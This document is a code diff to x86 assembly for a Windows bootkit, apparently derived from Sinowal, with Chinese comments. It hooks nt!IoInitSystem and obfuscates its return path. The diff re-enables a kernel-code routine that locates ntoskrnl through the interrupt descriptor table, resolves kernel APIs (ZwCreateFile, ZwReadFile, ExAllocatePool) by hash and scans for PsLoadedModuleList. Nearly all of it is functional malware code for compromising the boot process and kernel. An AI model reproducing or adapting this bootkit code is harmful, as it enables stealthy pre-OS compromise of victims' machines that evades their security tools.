@@ -480,17 +480,22 @@ nop
 nop
 nop
 push dword [esp+0x4]   ; store argument 1 = 0x80087000, from nt!IoInitSystem
-push eax    ; first call = Execute_Kernel_Code
-push eax     ; second call = call to original address
+push eax    ; first call = Execute_Kernel_Code  被 mov [esp+0x30],eax覆盖成 Execute_Kernel_Code 地址
+push eax     ; second call = call to original address 被 mov [esp+0x2c],eax 覆盖成 _IoInitSystem@4 地址
+; Obfuscation_Return 的最后一条返回指令ret执行 esp 指向 这里, 所以会运行到 _IoInitSystem@4
+; _IoInitSystem@4 运行完返回 Execute_Kernel_Code
 call dword Obfuscation_Function
 
 ; set return obfuscation address to original address that was overwritten (forward the function)
 mov eax,[esi+10]  ; esi = original calling address (that was overwritten by applied patch), PMwPC_Address
+; eax == _IoInitSystem@4
 mov [esp+0x2c],eax  ; set return pointer (using the obfuscation return) to the original calling address
 
 ; remove hook by reassigning jump address
 mov edi,[esp+0x38] ; edi => return eip from this hook call
+; edi == call    _IoInitSystem@4 的下一条指令
 sub eax,edi    ; original calling address - return eip to code (calculate relative original calling address)
+;  此处是还原 原来的patch
 mov [ss:edi-4],eax       ; for every next call: do not call this bootkit
 
 ; set return eip of the forwarded function to Execute_Kernel_Code
@@ -501,7 +506,7 @@ jmp short Obfuscation_Return
 Execute_Kernel_Code:
 
 ; execute the Kernel Code (original hooked/forwarded initialization function returns here)
-;call Kernel_Code   ; =)
+call Kernel_Code   ; =)
 nop
 nop
 nop
@@ -510,6 +515,123 @@ nop
 nop
 nop
 ret 4      ; remove the pushed argument (as the original function would have done)
+
+Kernel_Code:
+pushad
+pushfd
+cld
+
+; set ds/es/ss back again to valid Data Segment Selectors
+xor eax,eax 
+Segmentation_Check_loop:
+lsl ebx,ax   ; load segment limit into ebx
+jnz Next_Segment_Selector ; if invalid or cannot be accessed ZF = 0, next segment selector
+inc ebx  ; +1 to get real value (normaly 0FFFFFFFFh)
+jnz Next_Segment_Selector     ; => if not max. (4 GB), next segment selector   (FFF..FF+1 = 0, so zero flag set if max.)
+
+lar ebx,ax  ; load access rights into ebx
+and bh,11111010b   ; mask out following bits: Present, DPL, System, Type [Data/Code, Write]
+cmp bh,10010010b     ; present? system? data? write access?
+je Found_Data_Segment_Selector        ;   => if yes found our Segment Selector to set
+
+Next_Segment_Selector:
+sub ax,00001000b   ; next segment selector
+jnz Segmentation_Check_loop    ; try next if not already the last one
+
+Found_Data_Segment_Selector:
+; set data segment registers to data segment selectors 
+; [usually segment selector 10h on Windows systems, which is usually ss]
+; 0x10 r0 32bit data
+mov es,ax
+mov ds,ax
+;mov ss,ax  ; <- ss must be same CPL as CS (!), crashes under VirtualBox
+CPU 486     ; for the wbinvd instruction
+wbinvd
+
+; ebp Analysis:
+;   ebp = original esp after all operations
+;   [ebp - 4]    ZwReadFile
+;   [ebp - 8]    ZwCreateFile
+;   [ebp - 12]   ZwClose
+;   [ebp - 16]   KeLoaderBlock
+;   [ebp - 20]   ExFrePool
+;   [ebp - 24]   ExAllocatePool
+;   [ebp - 28]   PsLoadedModuleList
+;   esp points here (esp = ebp)
+;   [esp]        pointer to data below
+sub esp,byte 34     ; create data frame on stack (later used with ebp)
+; let's get PsLoadedModuleList
+;  1. get IDT base
+;  2. get address of Division by Zero (Interrupt 0) Exception Handler
+;  3. scan memory for PE image, should be ntoskrnl then
+;  4. scan code of ntoskrnl for a signature and extract PsLoadedModuleList pointer
+
+; store IDTR on stack
+sidt [ds:esp]   ; store IDT Register on stack (32 bit address, 16 bit limit)
+pop bx   ; 16 bit IDT limit
+pop ebx     ; 32 bit IDT address
+mov ebp,esp   ; = original esp - 32, = 1 PsLoadedModuleList, 6 imports, (6 bytes IDTR just popped from stack)
+
+; get address of Interrupt 0 Handler
+mov eax,[ebx+0x4]   ; Offset 16..31  [Interrupt Gate Descriptor]
+mov ax,[ebx]    ; Offset 0..15   [Interrupt Gate Descriptor]
+and eax,0xFFFFF000   ; page base address
+xchg eax,ebx      ; store address in ebx
+
+; scan memory of Exception Handler for a PE Image -> this will resolve a pointer to ntoskrnl
+Find_Exception_Handler_PE_Image:
+sub ebx,4096  ; next page to check (PE images are always page aligned)
+cmp word [ebx],'MZ'    ; DOS Header found?
+jnz Find_Exception_Handler_PE_Image
+mov eax,[ebx+0x3c]    ; get address of PE Header (skip DOS Header/Stub)
+cmp eax,2 * 4096     ; check range (PE Header must be within 8192 bytes)
+jnc Find_Exception_Handler_PE_Image
+cmp dword [ebx+eax],'PE'
+jnz Find_Exception_Handler_PE_Image
+
+; obfuscation call
+;   [esp] contains then pointer to data
+;         has been seen in previous Sinowal version for getting PhysicalDrive string
+call dword Obfuscation_Call
+
+; standard API hashes (all of ntoskrnl)
+ExAllocatePool    dd    03707E062h  ; ebp-24
+ExFrePool         dd    09D489D1Fh  ; ebp-20
+KeLoaderBlock     dd    03E7DC5A8h  ; ebp-16 (unused)
+ZwClose           dd    0DCD44C5Fh  ; ebp-12
+ZwCreateFile      dd    003888F9Dh  ; ebp-8
+ZwReadFile        dd    084FCD516h  ; ebp-4
+                  dd    000000000h  ; hash zero terminator (no more hash following)
+; here execution flow goes on..
+Obfuscation_Call:
+; get absolute address of PE Image the exception handler exists in, to scan it
+lea edx,[ebx+eax]                                                               ; edx = absolute address of PE Header
+mov ecx,[edx+0x50]                                                              ; SizeOfImage
+mov edi,ebx                                                                     ; edi = address of PE image (of DOS header)
+
+; scan 74 E3 39 05
+;_text:004E936E 74 E3                                   jz      short loc_4E9353
+;_text:004E9370 39 05 30 CE 54 00                       cmp     ds:_PsLoadedModuleList, eax
+; 74 DB 
+mov al,74h
+Scan_PsLoadedModuleList:
+repne scasb
+jnz Image_Parsing_done
+cmp dword [edi-1],0x0539E374
+jnz Scan_PsLoadedModuleList
+cmp word [edi + 7],0xdb74
+jnz Scan_PsLoadedModuleList
+
+Found_Signature:
+dec edi  ; found the code signature, extract PsLoadedModuleList
+mov eax,[edi+0x4]    ; store PsLoadedModuleList pointer in eax 
+
+Image_Parsing_done:
+
+;mov esp,ebp 
+popfd
+popad
+ret
 
 Total_End_of_Binary:
 times 4*1024-($-$$) db 0
